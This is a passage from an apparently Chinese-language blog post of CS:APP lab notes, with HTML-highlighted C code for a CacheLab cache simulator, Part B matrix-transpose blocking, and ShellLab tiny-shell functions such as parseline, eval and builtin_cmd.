class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">mem_addr_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>&#123;</span><br>    <span class="hljs-keyword">mem_addr_t</span> tag;<br>    <span class="hljs-keyword">int</span> valid;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> lru; <br>&#125;;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line_t</span>* <span class="hljs-title">cache_set_t</span>;</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">cache_set_t</span>* <span class="hljs-keyword">cache_t</span>;<br><br><span class="hljs-keyword">cache_t</span> cache;<br><span class="hljs-keyword">mem_addr_t</span> set_index_mask = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessData</span><span class="hljs-params">(<span class="hljs-keyword">mem_addr_t</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> eviction_line;<br>  <span class="hljs-comment">// 注意是无符号整数</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> eviction_lru = <span class="hljs-number">-1</span>;<br>  eviction_line = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);<br>  <span class="hljs-keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];<br><br>  <span class="hljs-comment">// 所需数据的cache_line编号</span><br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span><br>    <span class="hljs-keyword">if</span> ( i &gt;= E )<br>    &#123;<br>      <span class="hljs-comment">// 数据未命中</span><br>      ++miss_count;<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;miss &quot;</span>);<br>      <span class="hljs-comment">// 在一组cache_line中查找将被删除的cache_line</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> ia = <span class="hljs-number">0</span>; ia &lt; E; ++ia )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )<br>        &#123;<br>          eviction_line = ia;<br>          eviction_lru = cache_set[ia].lru;<br>        &#125;<br>     &#125;<br>      <span class="hljs-comment">// 如果当前这个要被删除的cache_line是valid</span><br>      <span class="hljs-comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span><br>      <span class="hljs-keyword">if</span> ( cache_set[eviction_line].valid )<br>      &#123;<br>        <span class="hljs-comment">// 删除数+1</span><br>        ++eviction_count;<br>        <span class="hljs-keyword">if</span> ( verbosity )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;eviction &quot;</span>);<br>      &#125;<br>      <span class="hljs-comment">// 模拟从**主存**读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span><br>      cache_set[eviction_line].valid = <span class="hljs-number">1</span>;<br>      cache_set[eviction_line].tag = tag;<br>      cache_set[eviction_line].lru = lru_counter++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 查找cache中的数据</span><br>    <span class="hljs-keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果找到数据了，自然就hit_count++</span><br>  ++hit_count;<br>  <span class="hljs-keyword">if</span> ( verbosity )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hit &quot;</span>);<br>  cache_set[i].lru = lru_counter++;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">replayTrace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *trace_fn)</span></span><br><span class="hljs-function"></span>&#123;<br>  FILE * trace_fp = fopen(trace_fn, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !trace_fp )<br>  &#123;<br>    <span class="hljs-keyword">int</span>* err_num = __errno_location();<br>    <span class="hljs-keyword">char</span>* err_str = strerror(*err_num);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, trace_fn, err_str);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1000</span>];<br>  <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-number">1000</span>, trace_fp) )<br>  &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">mem_addr_t</span> addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;S&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;L&#x27;</span> || buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(&amp;buf[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%llx,%u&quot;</span>, &amp;addr, &amp;len);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %llx,%u &quot;</span>, buf[<span class="hljs-number">1</span>], addr, len);<br>      <span class="hljs-comment">// 读取/写入数据</span><br>      <span class="hljs-comment">// 写入数据同样需要判断数据是否存在与cache。如果数据不在，同样要将其读回cache</span><br>      accessData(addr);<br>      <span class="hljs-comment">// 如果当前指令是修改指令，则上一条accessData读取数据，下一条的accessData写入数据</span><br>      <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;M&#x27;</span> )<br>        accessData(addr);<br>      <span class="hljs-keyword">if</span> ( verbosity )<br>        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>  &#125;<br>  fclose(trace_fp);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-Part-B"><a href="#2-Part-B" class="headerlink" title="2)Part B"></a>2)Part B</h3><h4 id="32-32"><a href="#32-32" class="headerlink" title="32*32:"></a>32*32:</h4><p>最优解法是非常暴力非常详细的写出每一行的移动情况，普通解法是规规矩矩的8分块。<a href="https://zhuanlan.zhihu.com/p/79058089">链接</a>_</p><h4 id="64-64"><a href="#64-64" class="headerlink" title="64*64:"></a>64*64:</h4><p>第一种解法是八分块然后再4分块。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (M == <span class="hljs-number">64</span>)<br>&#123;<br><span class="hljs-keyword">int</span> i, j, x, y;<br><span class="hljs-keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">8</span>)<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">8</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (x = i; x &lt; i + <span class="hljs-number">4</span>; ++x)<br>&#123;<br>x1 = A[x][j]; x2 = A[x][j+<span class="hljs-number">1</span>]; x3 = A[x][j+<span class="hljs-number">2</span>]; x4 = A[x][j+<span class="hljs-number">3</span>];<br>x5 = A[x][j+<span class="hljs-number">4</span>]; x6 = A[x][j+<span class="hljs-number">5</span>]; x7 = A[x][j+<span class="hljs-number">6</span>]; x8 = A[x][j+<span class="hljs-number">7</span>];<br><br>B[j][x] = x1; B[j+<span class="hljs-number">1</span>][x] = x2; B[j+<span class="hljs-number">2</span>][x] = x3; B[j+<span class="hljs-number">3</span>][x] = x4;<br>B[j][x+<span class="hljs-number">4</span>] = x5; B[j+<span class="hljs-number">1</span>][x+<span class="hljs-number">4</span>] = x6; B[j+<span class="hljs-number">2</span>][x+<span class="hljs-number">4</span>] = x7; B[j+<span class="hljs-number">3</span>][x+<span class="hljs-number">4</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (y = j; y &lt; j + <span class="hljs-number">4</span>; ++y)<br>&#123;<br>x1 = A[i+<span class="hljs-number">4</span>][y]; x2 = A[i+<span class="hljs-number">5</span>][y]; x3 = A[i+<span class="hljs-number">6</span>][y]; x4 = A[i+<span class="hljs-number">7</span>][y];<br>x5 = B[y][i+<span class="hljs-number">4</span>]; x6 = B[y][i+<span class="hljs-number">5</span>]; x7 = B[y][i+<span class="hljs-number">6</span>]; x8 = B[y][i+<span class="hljs-number">7</span>];<br><br>B[y][i+<span class="hljs-number">4</span>] = x1; B[y][i+<span class="hljs-number">5</span>] = x2; B[y][i+<span class="hljs-number">6</span>] = x3; B[y][i+<span class="hljs-number">7</span>] = x4;<br>B[y+<span class="hljs-number">4</span>][i] = x5; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>] = x6; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>] = x7; B[y+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>] = x8;<br>&#125;<br><span class="hljs-keyword">for</span> (x = i + <span class="hljs-number">4</span>; x &lt; i + <span class="hljs-number">8</span>; ++x)<br>&#123;<br>x1 = A[x][j+<span class="hljs-number">4</span>]; x2 = A[x][j+<span class="hljs-number">5</span>]; x3 = A[x][j+<span class="hljs-number">6</span>]; x4 = A[x][j+<span class="hljs-number">7</span>];<br>B[j+<span class="hljs-number">4</span>][x] = x1; B[j+<span class="hljs-number">5</span>][x] = x2; B[j+<span class="hljs-number">6</span>][x] = x3; B[j+<span class="hljs-number">7</span>][x] = x4;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>第二种解法在那个链接里的评论区里1024次miss, 未看.</p><h4 id="61-67"><a href="#61-67" class="headerlink" title="61*67:"></a>61*67:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i += <span class="hljs-number">16</span>)<br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; M; j += <span class="hljs-number">16</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; i + <span class="hljs-number">16</span> &amp;&amp; k &lt; N; ++k)<br>        &#123;<br>            <span class="hljs-keyword">int</span> temp_position = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">int</span> temp_value = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">int</span> l;<br>            <span class="hljs-keyword">for</span> (l = j; l &lt; j + <span class="hljs-number">16</span> &amp;&amp; l &lt; M; ++l)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (l == k) <span class="hljs-comment">/* 横坐标等于纵坐标，局部变量暂存，整个block读完再处理 */</span><br>                &#123;<br>                    temp_position = k;<br>                    temp_value = A[k][k];<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    B[l][k] = A[k][l];<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (temp_position != <span class="hljs-number">-1</span>) <span class="hljs-comment">/* 遇到了冲突元素 */</span> <br>            &#123;<br>                B[temp_position][temp_position] = temp_value;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h3><p>附上手算miss率的神人<a href="https://zhuanlan.zhihu.com/p/28585726">专栏</a>. 以及CMU的<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">课件</a>, miss次数好像就是这上面的.</p><h2 id="ShellLab"><a href="#ShellLab" class="headerlink" title="ShellLab"></a>ShellLab</h2><h3 id="通过parseline理解一下如何编写"><a href="#通过parseline理解一下如何编写" class="headerlink" title="通过parseline理解一下如何编写"></a>通过parseline理解一下如何编写</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * parseline - Parse the command line and build the argv array.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Characters enclosed in single quotes are treated as a single</span><br><span class="hljs-comment"> * argument.  Return true if the user has requested a BG job, false if</span><br><span class="hljs-comment"> * the user has requested a FG job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span>  <span class="hljs-comment">// cmdline--&gt;argv_array</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> <span class="hljs-built_in">array</span>[MAXLINE]; <span class="hljs-comment">/* holds local copy of command line */</span><br>    <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">array</span>;          <span class="hljs-comment">/* ptr that *traverses* command line */</span><br>    <span class="hljs-keyword">char</span> *delim;                <span class="hljs-comment">/* points to first space delimiter */</span><br>    <span class="hljs-keyword">int</span> argc;                   <span class="hljs-comment">/* number of args */</span><br>    <span class="hljs-keyword">int</span> bg;                     <span class="hljs-comment">/* background job? */</span><br><br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    buf[<span class="hljs-built_in">strlen</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27; &#x27;</span>;  <span class="hljs-comment">/* replace trailing &#x27;\n&#x27; with space */</span><br>    <span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore leading spaces */</span><br>buf++;<br><br>    <span class="hljs-comment">/* Build the argv list */</span> <span class="hljs-comment">//这里已经到了第一个非空字符</span><br>    argc = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>buf++;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>); <span class="hljs-comment">//这两个delim指明的是当前参数后面的分隔符</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (delim) &#123;<br>argv[argc++] = buf;<br>*delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<span class="hljs-comment">//截断</span><br>buf = delim + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore spaces */</span><br>       buf++;<br><br><span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>    buf++;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br>    &#125;<br>    argv[argc] = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* ignore blank line */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* should the job run in the background? */</span><br>    <span class="hljs-keyword">if</span> ((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>) &#123;<br>argv[--argc] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bg;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-eval-处理命令行输入-cmdline"><a href="#1-eval-处理命令行输入-cmdline" class="headerlink" title="1.eval(): 处理命令行输入(cmdline)"></a>1.<code>eval()</code>: 处理命令行输入(cmdline)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">sigset_t</span> <span class="hljs-built_in">set</span>;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> state = UNDEF;<br>    <span class="hljs-keyword">char</span> *argv[MAXLINE];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == parseline(cmdline, argv))<br>        state = BG;<br>    <span class="hljs-keyword">else</span><br>        state = FG;<br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv))<br>    &#123;<br>        sigemptyset(&amp;<span class="hljs-built_in">set</span>);<br>        sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGINT), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGCHLD), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGSTOP);<br>        sigprocmask(SIG_BLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;fork error!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">//进入到了fork出来的子程序</span><br>        &#123;<br>            sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br>            setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//1.路径 2.参数（包括1） 3.环境变量</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: commond not found!&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//fork完成， 加入joblist</span><br>        addjob(jobs, pid, state, cmdline);<br>        <span class="hljs-keyword">if</span> (sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;sigprocmask error&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (state == FG)<br>            waitfg(pid);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-builtin-cmd-判断是否内置函数并跳转"><a href="#2-builtin-cmd-判断是否内置函数并跳转" class="headerlink" title="2.builtin_cmd()判断是否内置函数并跳转"></a>2.<code>builtin_cmd()</code>判断是否内置函数并跳转</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>        do_bgfg(argv);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>))<br>        listjobs(jobs);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* not a builtin command */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-do-bgfg-执行bg-fg命令"><a href="#3-do-bgfg-执行bg-fg命令" class="headerlink" title="3.do_bgfg()执行bg fg命令"></a>3.<code>do_bgfg()</code>执行bg fg命令</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 